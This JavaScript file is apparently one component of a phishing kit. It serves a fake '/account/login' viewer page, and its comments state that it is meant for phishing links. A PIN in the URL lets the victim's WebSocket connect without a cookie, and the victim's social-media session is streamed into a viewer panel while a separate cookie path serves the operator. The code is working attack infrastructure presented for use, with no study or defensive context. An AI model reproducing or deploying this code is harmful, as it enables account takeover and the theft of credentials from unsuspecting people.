// Viewer page — loaded at /account/login?ref=<numeric-ref>
// Optional &p=<pin> in the URL: used for phishing links so the victim's
// WebSocket can authenticate without a session cookie.  The PIN is never
// written to localStorage — keeping it only in the URL ensures the browser
// discards it when the tab is closed.
const params = new URLSearchParams(location.search);
const ref = params.get('ref') || '';
const pinFromUrl = params.get('p') || '';

const viewer = new SocialPanelViewer(document.querySelector('#screen'));
const overlay = document.querySelector('#loadingOverlay');

function fail(msg) {
  document.body.innerHTML = `<p style="color:#fff;padding:2em;font:16px sans-serif">${msg}</p>`;
}

viewer.onReady = () => { if (overlay) overlay.classList.add('hidden'); };

if (!ref) { fail('Brak ref. Wróć do panelu.'); }
else {
  // Auth: admin uses session cookie; phishing link passes PIN in x-pin header.
  const headers = pinFromUrl ? { 'x-pin': pinFromUrl } : {};
  fetch(`/api/account-by-ref/${encodeURIComponent(ref)}/start`, {
    method: 'POST',
    credentials: 'same-origin',
    headers,
  })
    .then(async (res) => {
      if (res.status === 401) { fail('Nieprawidłowy PIN. Wróć do panelu i zaloguj się ponownie.'); return; }
      if (res.status === 404) { fail('Nieznany link.'); return; }
      const { accountId } = await res.json();
      // Admin (cookie auth): no PIN in WebSocket URL.
      // Phishing link: pass PIN as query param so the WS upgrade authenticates.
      viewer.connect(accountId, pinFromUrl || null);
    })
    .catch(() => fail('Błąd połączenia.'));
}
